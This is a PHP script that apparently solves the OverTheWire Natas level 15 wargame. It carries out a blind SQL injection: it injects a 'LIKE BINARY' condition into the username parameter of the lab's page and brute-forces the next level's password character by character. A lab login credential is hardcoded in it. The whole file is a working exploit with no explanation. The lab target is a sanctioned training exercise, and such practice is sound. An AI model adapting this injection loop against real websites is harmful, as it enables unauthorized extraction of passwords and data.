<?php
$elems =  array_merge(range('A', 'Z'), range('a', 'z'),range(0,9));
$fullText = "";
for ($j=0; $j < count($elems); $j++) { 
    $found = false;
    for ($i=0; $i < count($elems); $i++) {
        $currentChar = $elems[$i];
        $rawTxt = ("natas16\" AND password LIKE BINARY \"".($fullText . $currentChar)."%");
        $encodedStr = urlencode($rawTxt);
        $host = "http://natas15.natas.labs.overthewire.org/index.php?debug=true&username={$encodedStr}";
        $ch = curl_init($host);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_USERPWD,"natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        $return = curl_exec($ch);
        curl_close($ch);
        $strPsExist = strpos($return,"This user exists");
        if($strPsExist !== false)
        {
            $found = true;
            $fullText .= $currentChar;
            echo $fullText;
            echo "\n";
        }
    }
    if(!$found){
        echo "the password is:";
        echo $fullText;
        break;
    }
}
?>